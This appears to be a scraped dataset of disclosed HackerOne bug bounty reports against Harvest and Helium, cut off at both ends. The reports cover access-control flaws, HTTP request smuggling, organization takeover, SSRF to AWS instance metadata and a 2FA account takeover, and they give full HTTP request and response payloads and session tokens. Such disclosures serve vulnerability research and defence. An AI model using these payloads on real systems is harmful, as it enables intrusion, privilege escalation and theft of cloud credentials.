Let me know if you need Video POC or any other information regarding this issue.
Best Regards !
Vijay Kumar 
    
    
        
            
                
                
                
            
        
    
indoappsec   posted a comment. Aug 20th (6 years ago)@jorgeleria : I haven't got any of the response for all the submitted issues. Can you give any ETA for these issues ?jorgeleria Harvest staff  changed the status to Triaged. Aug 22nd (6 years ago)Hi Vijay,
Thanks for your patience! You will get an answer to all your reports during this week.
As for this one I just verified it, we are going to fix it and we will be awarding a bounty.
I'll contact you as soon as it is fixed!
Best regards,
Jorge
    
    
        
            
                
                
                
            
        
    
indoappsec   posted a comment. Aug 22nd (6 years ago)@jorgeleria  : Thanks for response. As you said you are merging the  #158982 issue in this. I would like to add one more slimier issue here. Project manager can change the default mail in configurations.
Link : https://vijaygangani.harvestapp.com/estimates/configure
HTTP request : 
POST /sender_emails/make_default/48848 HTTP/1.1
Host: vijaygangani.harvestapp.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/javascript, text/html, application/xml, text/xml, /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.7
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://vijaygangani.harvestapp.com/estimates/configure
Content-Length: 143
Cookie: [Cookie_Value]
Connection: keep-alive
authenticity_token=&x_requested_with=XMLHttpRequest 
Kindly Add this Issue in this report and let me know if you need any other help from my side.
Best Regards !
Vijay Kumar
jorgeleria Harvest staff  closed the report and changed the status to Resolved. Aug 29th (6 years ago)Hi Vijay,
This should be fixed!
Could you check if you are able to reproduce it now?
Thanks,
JorgeHarvest  rewarded indoappsec with a $250 bounty. Aug 30th (6 years ago)Thanks for helping make Harvest more secure!indoappsec   requested to disclose this report. Aug 30th (6 years ago)jorgeleria Harvest staff  changed the report title from Project Manager with limited access to company information can Set up Email for invoices and estimates(Access control Issue) to PM with can Set up email for invoices and estimates (Access control Issue). Sep 29th (6 years ago)  This report has been disclosed. Sep 29th (6 years ago)",https://hackerone.com/reports/158979,New York,United States,New York,2016,8,13,5,23
Harvest,51-100,0.0,1m-10m,$150.00,Low,2.0,Improper Authentication - Generic,Linking Invoice to uninvited project.,"bugdiscloseguys  submitted a report to Harvest.Oct 10th (6 years ago)Hey there,
I found that an project manager can link his/her invoice to an project where he/she is uninvited.
While linking the invoice an request is sent :
Code 2.20 KiBWrap lines Copy Download1POST /invoices/10877569 HTTP/1.1
2Host: hshteam.harvestapp.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0
4Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate, br
7Referer: https://hshteam.harvestapp.com/
8Cookie: _harvest_sess=WjRXQ0xiMGZ2ZlhJQStndjdVeTJVYmZ5NHFhZDd2YmNxY0MySk00Z0ltL2ZhQ3d5NGZHY1Z0RTZxUld1bU91d2ZoSnNVWEVVVi9XaTAweG00WjRyN2N4STJWYW9EdWQydkxPVFkxUWszVnVBZVZEVWd5RFFIYk5iclhPYnUyQXBKM295MmJ0MU5WYjVtWTYyREFUKzFqZmN5dGR5VDR4QUl4MnFxR0RVVGhJNTNNSm9tK0JZS1l0NXVoSlg4ekUvb3AvbTZENFBkVjNKZitTVm5XT2JWUT09LS0vWE5DWUxqSnY3cHl1M3RFZkh2QStBPT0=--eaf6f350690f1faea68ce3fc45d306ab1b72ea5e; removed_from_remarketing=true; production_access_token=RUtyVTVMdTRJRUpSMjFHaVJJQmtiWWovNit2a3ArdW5OMDQwbGN4MkE3Y29HeTZVOGQzLzF2bnNLaExPMkJxVmRDU3Y0c1BJTFhsYXE3VUJXaWlkaG5zeE4zMkdEQzhSelFJdFZ2Y0I4TUhoeUNuZFExeUIrdUcrT2lnZ2QyM0tFcXpaK2lDY2RIY1FaN0NERGczcTl3PT0tLUR1ZGg2QXpkZG92QzNrL3BaQXpLcHc9PQ==--6cf9adb8b4822020050cf45d09f76acd20ca687c; _ga=GA1.3.2127551324.1476064747; _gat_UA-103886-9=1
9Connection: keep-alive
10Upgrade-Insecure-Requests: 1
11Content-Type: application/x-www-form-urlencoded
12Content-Length: 1184
13
14utf8=✓&_method=patch&authenticity_token=31H8s7Dz /isUnhw1JuCI8qwEeEoSwxVqKHzl6Px8HzJmsFDVAzY7/dxqyGyCJydpfZz0jmoFGlNVLJa9PnTdA==&invoice[number]=4&allow_duplicate_invoice_numbers=false&editing_invoice_id=10877569&invoice[purchase_order]=&invoice[issued_at_human_format]=10/10/2016&invoice[due_at_human_format]=upon receipt&invoice[due_at]=10/10/2016&invoice[client_id]=4900354&invoice[tax]=&invoice[tax2]=&invoice[discount]=&invoice[currency]=United States Dollar - USD&invoice[subject]=&invoice[invoice_items_attributes][1476067962062][position]=NaN&invoice[invoice_items_attributes][1476067962062][kind]=Product&invoice[invoice_items_attributes][1476067962062][description]=addas&invoice[invoice_items_attributes][1476067962062][project_id]=11933888&invoice[invoice_items_attributes][1476067962062][quantity]=1.00&invoice[invoice_items_attributes][1476067962062][unit_price]=0.00&invoice[invoice_items_attributes][1476067962062][taxed]=0&invoice[invoice_items_attributes][1476067962062][taxed2]=0&invoice[notes]=
15
Just Change The [project_id]=11933888  An you'll get a 302 Redirect.
Response:
Code 2.08 KiBWrap lines Copy Download1HTTP/1.1 302 Found
2Server: nginx
3Date: Mon, 10 Oct 2016 02:54:28 GMT
4Content-Type: text/html; charset=utf-8
5Connection: keep-alive
6Status: 302 Found
7X-Frame-Options: SAMEORIGIN
8X-XSS-Protection: 1; mode=block
9X-Content-Type-Options: nosniff
10Cache-Control: private, no-store, no-cache, max-age=0, must-revalidate
11p3p: CP=""Our privacy policy is available online: https://www.getharvest.com/services/privacy-policy""
12Content-Security-Policy-Report-Only: report-uri /csp_reports; default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval' *.google-analytics.com *.nr-data.net ajax.googleapis.com cache.harvestapp.com js-agent.newrelic.com js.appcenter.intuit.com platform.twitter.com www.google.com www.googleadservices.com www.googletagmanager.com; style-src 'self' 'unsafe-inline' cache.harvestapp.com js.appcenter.intuit.com www.google.com
13X-App-Server: app8
14X-Robots-Tag: noindex, nofollow
15Location: https://hshteam.harvestapp.com/invoices/10877569
16X-Served-From: https://hshteam.harvestapp.com/invoices/10877569
17Set-Cookie: _harvest_sess=MDN0SWFmQjVMbTBKNS9RTDhoY2lEcVhKcFpXRkJ3MlhkOXh2OEU1Z3pTVEVYWEo3SGZMYkNqN2xEbE4vNGlid1hNNWxXcTJob0NJQVRDZHlCUUlpMGVQWXJaRitEUmdpeDZNbWpha1RkQUVWRGRaMnNFTzMycE1xNStLSGo1T3kzN2ordEEycFRRVlpGcjVFMGt3ZjlpSVRYSW9KMXNMWnB5THJIN1JtNTZyTmxMSG5CTS9pTjUrSUc1bE4xaUEyNTdrRm5aN0Z2UjN5cnIyaXN2dUI5S0JkWDliSG9HOVlkQUExTFNLM04ybE1QT2pXUmtLSkZXVEpYVnQ5MHF0YTZWdXlHbk1CcnBWbGFwZEFUQkFRUDdCZXZNNWVReXJQTWJTcGdtSVpVY2laSHdjT3BYYzF2bFRib2xUMkN3bFZPNGtZR0lROEt0aHBWeERNMUQ4b1daV3orRGRZQkVaNVNKQmJ5NzVmTE56a0thbEtaeDRVNW8wMGhxZzdsREpOL3JJUEZPYi9Ob3pHNlFaenpKV0k1VjZveVRERS9Wa2FyL1FnL3FDZThOZVF3bmtOdERiQ1RsTHM3MWNDSzg5WC0tNlJJOGVwRVBaMG1vTTlqOTJDczBmdz09--c496b2c78a2ca74dd7d0a87563c1abce8362024e; domain=.harvestapp.com; path=/; expires=Tue, 25 Oct 2016 02:54:28 -0000; secure; HttpOnly
18X-Request-Id: 9c397fe799a2f9dc3924fb1ba7eb2443
19X-Runtime: 0.070117
20Strict-Transport-Security: max-age=31536000
21Strict-Transport-Security: max-age=31536000; includeSubDomains
22X-Server: lb2
23Content-Length: 114
24
25<html><body>You are being <a href=""https://hshteam.harvestapp.com/invoices/10877569"">redirected</a>.</body></html>
26
Now You Wont be able to access that invoice :P as it's been merged :)
Thanks :)
God is great <3",https://hackerone.com/reports/174871,New York,United States,New York,2016,10,10,2,58
Helium,101-250,0.0,1m-10m,$500.00,High,7.95,HTTP Request Smuggling,HTTP request Smuggling,"dracomalfoy  submitted a report to Helium.May 7th (3 years ago)When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to ""smuggle"" a request to one device without the other device being aware of it. 
console.helium.com s vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.
Products affected:
Helium console Website. :  console.helium.com
Steps To Reproduce:

Run the burp suite turbo intruder on the following request

Code 858 BytesWrap lines Copy Download1
2POST /api/sessions HTTP/1.1
3Host: console.helium.com
4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
5Accept: application/json, text/plain, */*
6Accept-Language: en-US,en;q=0.5
7Accept-Encoding: gzip, deflate
8Referer: https://console.helium.com/login
9Content-Type: application/json
10Content-Length: 109
11DNT: 1
12Connection: close
13Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9
14Transfer-Encoding: chunked
15
1639
17{""session"":{""email"":""fdsfsd@fgd.jk"",""password"":""sdfsdf""}}
1800
19
20GET / HTTP/1.1
21Host: www.helium.com
22foo: x
23
24


Script for tubro Intruder is attached. Word list can be any list containing any characters.


Observe 200 Ok response for the /api/sessions post request which is supposed to give  401 Unauthorized   {""errors"":{""error"":[""The email address or password you entered is not valid""]}} Please refer the attached screenshot ( Smuggle Request1.png ) which contain the expected response. 


This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A recoding is attached as well.


Any suggestions or improvement in reports are welcome
Impact
It is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation and cache poisoning can be the impact of this vulnerability as well. Self-Xss can be escalated to XSS. It can be chained with other vulnerabilities to raise their severity.
As unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.
For more information about the vulnerability please refer :
https://cwe.mitre.org/data/definitions/444.html ;
https://capec.mitre.org/data/definitions/33.html4 attachments:F819006: intruder.txtF819022: Smuggle_Request1.pngF819024: Final_Response..pngF819032: helium_http_smuggling_.mp4",https://hackerone.com/reports/867952,California,United States,San Francisco,2020,5,7,10,7
Helium,101-250,0.0,1m-10m,$500.00,High,8.9,Improper Access Control - Generic,Organization Takeover,"azraelsec  submitted a report to Helium.Mar 3rd (3 years ago)Hello @helium,
The console.helium.com application doesn't correctly manage the /membership/ resources and allows a user to privilege escalate an organization of which he's part of just modifying it's role.
Steps to reproduce the bug
1) Let's make two user accounts:

azraelsec@wearehackerone.com [A]
███ [B] (this is actually my personal account and can be deleted)

Initial Context: azraelsec is Administrator of the hackerone organization while federicogerardi94 is Administrator of the testhackerone organization.
Goal: azraelsec becomes Administrator of testhackerone.
2) [B] invites [A] to take part in his testhackerone organization with the role of Manager
3) [A] switches to testhackerone organization and makes a graphql query to leak his Manager membership's id (using graphql it's only possible to see the memberships of the current organization):
Code 2.14 KiBWrap lines Copy Download1POST /graphql HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 488
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxMTQ0LCJpYXQiOjE1ODMyNTQ3NDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIzNzQ4ZmJkYS1iMjhiLTRlOWYtOThiMy00ZTUzMGRlYWEwNmMiLCJuYmYiOjE1ODMyNTQ3NDMsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.-1VwG72225yPkZ0BimNSw_DFURRlT8Wh-AcAuDXgJFEEfiPduEdWcwwxY6-oQEHx8ILFUlxQYdbduYiTA-D79Q
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTQ3NDg0OTgsImV2ZW50SWQiOjE5MywiaWRlbnRpZnlJZCI6NDEsInNlcXVlbmNlTnVtYmVyIjoyMzR9
17
18{""operationName"":""PaginatedMembershipsQuery"",""variables"":{""page"":1,""pageSize"":10},""query"":""query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n""}
Code 757 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Connection: close
3Cache-Control: max-age=0, private, must-revalidate
4Content-Length: 514
5Content-Type: application/json; charset=utf-8
6Date: Tue, 03 Mar 2020 16:59:27 GMT
7Server: Cowboy
8Strict-Transport-Security: max-age=31536000
9Via: 1.1 vegur
10
11{""data"":{""memberships"":{""__typename"":""PaginatedMemberships"",""entries"":[{""__typename"":""Membership"",""email"":""████████"",""id"":""512c8188-7008-49ce-a140-3538696e8c2c"",""inserted_at"":""2020-03-03T16:09:37"",""role"":""admin"",""two_factor_enabled"":false},{""__typename"":""Membership"",""email"":""azraelsec@wearehackerone.com"",""id"":""bc96332e-c6b4-4728-b35e-8145eea0996a"",""inserted_at"":""2020-03-03T16:42:49"",""role"":""manager"",""two_factor_enabled"":false}],""pageNumber"":1,""pageSize"":10,""totalEntries"":2,""totalPages"":1}}}
NOTE: [A] is a member of testhackerone with the role of Manager using the membership id bc96332e-c6b4-4728-b35e-8145eea0996a
3) [A] switches back to his hackerone organization (this will provide him a new full-privileged token) and sends a PUT request on the /membership/ resource pointing out the membership's id leaked before, changing his role to admin:
Code 1.73 KiBWrap lines Copy Download1PUT /api/memberships/bc96332e-c6b4-4728-b35e-8145eea0996a HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 31
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxNTA0LCJpYXQiOjE1ODMyNTUxMDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiJkODIxNzAwYS0xMGE5LTQwOGItYjc3ZC01OGY5ODY2ZWFkZmUiLCJuYmYiOjE1ODMyNTUxMDMsIm9yZ2FuaXphdGlvbiI6IjZjNmM4YzhhLTQ5ZmUtNGJlZi1hMDBjLWZkOTliZWUzOWIwZCIsIm9yZ2FuaXphdGlvbl9uYW1lIjoiaGFja2Vyb25lIiwic3ViIjoiNTU5NDZkMGUtMGE5MC00ZDRkLTlkYjgtMTIyMzYyZjU3NzU2IiwidHlwIjoiYWNjZXNzIn0.r13Aj4TXYzLYJ7clq9gl_SbpdSnVZpUsj0rFtgIMMeUXAE-44iiReL8bffEy4414L6Ess-dOH5L7MFiT55GAqw
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTEwNzEwNDEsImV2ZW50SWQiOjEzOSwiaWRlbnRpZnlJZCI6MjksInNlcXVlbmNlTnVtYmVyIjoxNjh9
17
18{""membership"":{""role"":""admin""}}
Since the back-end only checks if the requesting account has is an admin in its actual organization' scope but not if the membership that he's modifying is related to this, the request works, allowing [A] to becoming Administrator of hackeronetest organization:
Code 456 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Connection: close
3Cache-Control: max-age=0, private, must-revalidate
4Content-Length: 154
5Content-Type: application/json; charset=utf-8
6Date: Tue, 03 Mar 2020 17:10:01 GMT
7Message: User role updated successfully
8Server: Cowboy
9Strict-Transport-Security: max-age=31536000
10Via: 1.1 vegur
11
12{""email"":""azraelsec@wearehackerone.com"",""id"":""bc96332e-c6b4-4728-b35e-8145eea0996a"",""joined_at"":""2020-03-03T16:42:49"",""role"":""admin"",""type"":""memberships""}
NOTE: [A] has to be sure not to switch to testhackerone!! To exploit the vulnerability [A] needs to remain inside the organization of which he is Administrator (a POST call to /api/organizations/6c6c8c8a-49fe-4bef-a00c-fd99bee39b0d/switch will invalidate the Bearer token and provide a new one that has the correct privileges).
4) Now [A] can switch again organization to hackeronetest and administrate it as Administrator:
Code 2.14 KiBWrap lines Copy Download1POST /graphql HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 488
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQyMDk5LCJpYXQiOjE1ODMyNTU2OTksImlzcyI6ImNvbnNvbGUiLCJqdGkiOiI0YWM5ZDk2OC1hMGYwLTQ5MDgtODZmMi0wNTE3ZjE3OTE0NjMiLCJuYmYiOjE1ODMyNTU2OTgsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.rShCG6pW0Pjkd_dd8KTslyKPU38jrzhMrn39dkxdIqhePsCFx4FsEmNSKXTNm2zD02dPZNkp_N_FGtcen8kaeQ
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTU3MDI0MTAsImV2ZW50SWQiOjIwMywiaWRlbnRpZnlJZCI6NDMsInNlcXVlbmNlTnVtYmVyIjoyNDZ9
17
18{""operationName"":""PaginatedMembershipsQuery"",""variables"":{""page"":1,""pageSize"":10},""query"":""query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n""}
Code 756 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Connection: close
3Cache-Control: max-age=0, private, must-revalidate
4Content-Length: 512
5Content-Type: application/json; charset=utf-8
6Date: Tue, 03 Mar 2020 17:17:12 GMT
7Server: Cowboy
8Strict-Transport-Security: max-age=31536000
9Via: 1.1 vegur
10
11{""data"":{""memberships"":{""__typename"":""PaginatedMemberships"",""entries"":[{""__typename"":""Membership"",""email"":""█████████"",""id"":""512c8188-7008-49ce-a140-3538696e8c2c"",""inserted_at"":""2020-03-03T16:09:37"",""role"":""admin"",""two_factor_enabled"":false},{""__typename"":""Membership"",""email"":""azraelsec@wearehackerone.com"",""id"":""bc96332e-c6b4-4728-b35e-8145eea0996a"",""inserted_at"":""2020-03-03T16:42:49"",""role"":""admin"",""two_factor_enabled"":false}],""pageNumber"":1,""pageSize"":10,""totalEntries"":2,""totalPages"":1}}}
Impact
This vulnerability lets a user with low privileges to escalate and to become Administrator of an Organization of which was a simple Manager, deleting the original Administrator and to full control it",https://hackerone.com/reports/809816,California,United States,San Francisco,2020,3,3,18,24
Helium,101-250,0.0,1m-10m,$500.00,High,7.95,Server-Side Request Forgery (SSRF),SSRF By adding a custom integration on console.helium.com,"th0roid  submitted a report to Helium.Dec 10th (2 years ago)A Server Side Request Forgery vulnerability was found in the Add a custom Integration feature on console.helium.com. By creating a custom HTTP integration, and setting the integration endpoint to http://169.254.169.254/latest/meta-data private meta-data from the AWS EC2 instance running can be retrieved.
Image F1111768: 1_ssrf.png 36.84 KiBZoom in Zoom out Copy Download
Image F1111767: 2_ssrf.png 18.03 KiBZoom in Zoom out Copy Download
The server makes the HTTP request and sets the response body  as the integration message every time that the device sends a packet. As the endpoint input is not validated, this makes the application vulnerable to a critical SSRF.
Image F1111779: 3_ssrf.png 33.22 KiBZoom in Zoom out Copy Download
Image F1111780: 4_ssrf.png 55.87 KiBZoom in Zoom out Copy Download
Endpoint set as: http://169.254.169.254/latest/meta-data/ami-id
Image F1111781: 5_ssrf.png 24.35 KiBZoom in Zoom out Copy Download
Impact
By exploiting this vulnerability an attacker can get access to the server internal network and access private and critical information.5 attachments:F1111767: 2_ssrf.pngF1111768: 1_ssrf.pngF1111779: 3_ssrf.pngF1111780: 4_ssrf.pngF1111781: 5_ssrf.pngh1_analyst_ava HackerOne triage  posted a comment. Dec 11th (2 years ago)Hi @th0roid, 
Thank you for the report! Unfortunately, we need a little more information from you before we can fully validate this report. Please provide a detailed proof of concept that includes the following:

How to find the vulnerable functionality
Steps to reproduce the issue
Any code snippets/curl commands/request and response headers that will help reproduce the issue
Any additional content such as screenshots/videos that will help demonstrate the vulnerability

Providing this information when submitting new reports will help us to quickly determine the validity of your report. Thank you for your help!
Regards,
@sodacanth0roid   posted a comment. Dec 11th (2 years ago)In order to reproduce this issue, the following is needed:

An active organization on console.helium.com and an administrator user
A Lorawan device in this organization.

The Helium console has a functionality where integrations can be configured. Integrations allow the devices to connect to cloud-based applications and send data over HTTP or MQTT.
These vulnerability arises in the add a custom integration feature. When creating a custom HTTP integration, an endpoint can be specified. If this integration is connected to a device, when the device transfers a packet the Helium server will make an HTTP request to the specified endpoint and the HTTP response will be returned in the application. This makes the server vulnerable to a SSRF vulnerability.
Steps to reproduce
 1 - Log in as a Administrator user on an Organization that has a device on https://console.helium.com .
2 - go to integrations and click on add a custom HTTP integration . 
   Image F1113446: ssrf_1.png 62.53 KiBZoom in Zoom out Copy Download
 3 - Set the integration endpoint to http://169.254.169.254/latest/meta-data and the HTTP request method to GET. When this endpoint is accesed by the server on a EC2 instance, it returns private metadata of the instance, that's why this endpoint works as a proof of concept on the criticality of this vulnerability.
   Image F1113455: ssrf_2.png 38.73 KiBZoom in Zoom out Copy Download
 4 - Add a label to this integration and save it.
  Image F1113460: ssrf_3.png 17.12 KiBZoom in Zoom out Copy Download
 5 - Add this label to the device configured on the organization. This associates the integration with the device, and the SSRF will be triggered when the device transfers a packet.
  Image F1113474: ssrf_4.png 50.69 KiBZoom in Zoom out Copy Download
6 - When the device sends a packet, the private data will be retrieved by the server and made visible to the attacker in the uplink message of the device section.
  Image F1113489: ssrf_5.png 55.41 KiBZoom in Zoom out Copy Download
5 attachments:F1113446: ssrf_1.pngF1113455: ssrf_2.pngF1113460: ssrf_3.pngF1113474: ssrf_4.pngF1113489: ssrf_5.pngjdgemm Helium staff  changed the status to Triaged. Dec 14th (2 years ago)Thanks for your submission. We are investigating.th0roid   posted a comment. Dec 16th (2 years ago)Great, anything you need just ask me.
Here you can read about mitigation in this possible case: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#case-2-application-can-send-requests-to-any-external-ip-address-or-domain-name
The most important thing is to block the endpoint if it is or resolves to any IP address on the private network ranges, and in this case the AWS Instance Metadata endpoints. This way an integration will not be used to get unauthorized access to helium systems.Helium  rewarded th0roid with a $500 bounty. Jan 12th (2 years ago)Thanks again for your submission.abhay-helium Helium staff  posted a comment. Feb 24th (2 years ago)@jdgemm close as Resolved? jdgemm Helium staff  closed the report and changed the status to Resolved. Feb 26th (2 years ago)th0roid   requested to disclose this report. May 25th (about 1 year ago)Can we disclose this report?jdgemm Helium staff  agreed to disclose this report. May 26th (about 1 year ago)Thanks for submission. Issue resolved.  This report has been disclosed. May 26th (about 1 year ago)",https://hackerone.com/reports/1055823,California,United States,San Francisco,2020,12,10,14,38
Helium,101-250,0.0,1m-10m,$100.00,Medium,5.45,Improper Authentication - Generic,Account takeover w/o interaction for a user that doesn't have 2fa enabled via 2fa linking and improper auth at /api/2fa/verify,"w2w  submitted a report to Helium.Mar 4th (3 years ago)Description:
Hello, team! I found 2 vulnerabilities in your 2FA implementation:
1) There is a possibility to link 2FA to any other account if it wasn't set up before and user ID is known on the request /api/2fa. In order to do this, after performing a request for 2FA linking, substitute the ID to the victim's ID, organization could be any.
{F737177}
{F737178}
Image F737179: x0ul4.png 391.90 KiBZoom in Zoom out Copy Download
2) We can log in to the account without knowing login and password, using 2FA only, ID should be known. As you can see, in this request, we. don't use tokens/cookie that could be related to the user's ID, we are using only ID a561a2de-b8fe-49f8-8943-fb42229b7b08 and valid code.
Thus, using these 2 bugs we can fully takeover an account that doesn't have 2FA enabled (it was skipped after the first login).
Steps to reproduce:

As a user1, register at https://console.helium.com, skip 2FA, copy the ID.
Register an account user2, register at https://console.helium.com, perform a 2FA request but with ID from user1. 2FA is enabled now on the account user1!
Perform a request /api/2fa/verify with valid code and ID of user1.

